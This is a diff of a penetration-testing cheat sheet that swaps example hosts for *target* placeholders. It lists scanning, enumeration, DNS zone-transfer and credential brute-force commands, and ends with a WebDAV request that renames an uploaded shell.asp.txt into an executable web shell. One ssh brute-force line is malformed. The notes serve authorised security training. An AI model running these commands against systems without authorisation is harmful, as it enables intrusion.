@@ -321,6 +321,8 @@ Choose last octets of ip address for dirs
 
 Scan for vulns with ./scan.sh *ip address* vuln --force
 
+scan.sh *target* vuln --force
+
 ```
 
 ```
@@ -361,7 +363,7 @@ nc -nv -u -z -w 1 *target* 160-162  > look within wireshark for OPEN ports
 
 ### UnicornScan
 
-unicornscan -mU -v -I INSERTIPADDRESS
+unicornscan -mU -v -I *target*
 
 us -H -msf -Iv *target* -p 1-65535 
 
@@ -378,11 +380,11 @@ us -mU -r200 -I *target* -p 1-65535  > us_10_11_1_5_udp
 
 ### Connect to udp if one is open
 
-nc -u INSERTIPADDRESS 48772
+nc -u *target* 48772
 
 ### Monster scan
 
-nmap INSERTIPADDRESS -p- -A -T4 -sC
+nmap *target* -p- -A -T4 -sC
 
 
 ### NDiff for nmap
@@ -430,11 +432,11 @@ xsltproc vulns-results.xml -o results.html
 ### Get network routing information
 
 
-tcptraceroute *target* or *domainname*
+tcptraceroute *target* or *target-domain*
 
-tctrace -I tap0 -d *domainname*
+tctrace -I tap0 -d *target-domain*
 
-ping
+ping *target*
 
 #### ping command for ipv6
 
@@ -450,7 +452,7 @@ arping *target* -c 1
 
 use with external ip or domain names
 
-dmitry -iwnse *target*or*targethost*
+dmitry -iwnse *target*or*target-domain*
 
 use with internal ip ranges
 
@@ -573,7 +575,7 @@ MSF anaonymous login scan
 you could try to connect using lists
 
 ```
-ssh -L users.txt -P passwords.txt -s 22
+ssh -L users.txt -P passwords.txt -s 22 *target*
 
 ```
 
@@ -645,7 +647,7 @@ https://pen-testing.sans.org/resources/papers/gcih/smtp-victim-good-time-105208
 
 ```
 
-nc -nvv INSERTIPADDRESS 25
+nc -nvv *target* 25
 HELO foo<cr><lf>
 INSERTSMTPCONNECT
 ```
@@ -712,14 +714,16 @@ There is a custom SMTP python scanner in PWK workbook and within my custom scrip
 
 ### Email Harvesting
 
-theharvester -d cisco.com -b google >google.txt
+theharvester -d *target-domain* -b google >google.txt
 
-theharvester -d cisco.com -l 10 -b bing >bing.txt
+theharvester -d *target-domain* -l 10 -b bing >bing.txt
 
 ### PORT 53 DNS
 
 Refer to Pen testing red workbook tab for Enumeration
+
 - Enumeration tab
+
 - Conduct scans for port 53
 
 ### dig
@@ -772,15 +776,15 @@ a.	/usr/share/dnsenum/dns.txt
 
 ### fierce
 
-Fierce -dns example.com -threads 3
+Fierce -dns *target-domain* -threads 3
 
 ### nmap dns zone transfers
 
-nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
+nmap --script=dns-zone-transfer -p 53 *target-domain*
 
 #### nmap dns brute scan
 
-nmap -p 80 --script dns-brute.nse vulnweb.com
+nmap -p 80 --script dns-brute.nse *target-domain*
 
 ### Port 69 - UDP - TFTP
 
@@ -823,8 +827,8 @@ o	finger @internal@external
 - Server:
 - Scripting language:
 - Apache Modules:
-- IP-address:
-- Domain-name address:
+- IP-address: *target*
+- Domain-name address: *target-domain*
 
 REF: Web Penetration testing with KALI LINUX
 
@@ -834,7 +838,7 @@ before jumping into the web application, let's check the headers from the web se
 
 #### Nmap scan http headers
 
-nmap --script http-headers *target domain name or *target*
+nmap --script http-headers *target* or *target-domain*
 
 ```
 incert nmap http-header-info
@@ -908,7 +912,7 @@ look for every other file
 
 ### wget
 
-wget -r http://website.com
+wget -r http://*target-domain*
 
 ### Nikto
 
@@ -952,7 +956,7 @@ x – Reverse Tuning Options (i.e., include all except specified)
 
 ### Nikto with squid proxy
 
-nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444
+nikto -h *target* -useproxy http://INSERTIPADDRESS:4444
 
 ### uniscan
 
@@ -964,7 +968,7 @@ Type “Uniscan-Gui”
 
 ### WHATWEB
 
-Whatweb -v target.website.com
+Whatweb -v *target-domain*
 
 ### wikto
 
@@ -999,7 +1003,7 @@ nmap --script http-iis-webdav-vuln -p80,8080 *target*
 
 ### nmap test for sql injection
 
-nmap -sV  –script=http-sql-injection www. testphp.vulnweb.com –p 80
+nmap -sV  –script=http-sql-injection *target* –p 80
 
 ### Webdav
 
@@ -1010,12 +1014,12 @@ nmap -sV  –script=http-sql-injection www. testphp.vulnweb.com –p 80
 ```
 
 ```
-root@kali:~/Downloads/davtest-1.0# nc 10.11.1.13 80 -vv
+root@kali:~/Downloads/davtest-1.0# nc *target* 80 -vv
 10.11.1.13: inverse host lookup failed: Unknown host
-(UNKNOWN) [10.11.1.13] 80 (http) open
+(UNKNOWN) [*target*] 80 (http) open
 COPY /Scripts/shell.asp.txt HTTP/1.1
-HOST: 10.11.1.13
-Destination: http://10.11.1.13/Scripts/shell.asp
+HOST: *target*
+Destination: http://*target*/Scripts/shell.asp
 Overwrite: T
 ```
 
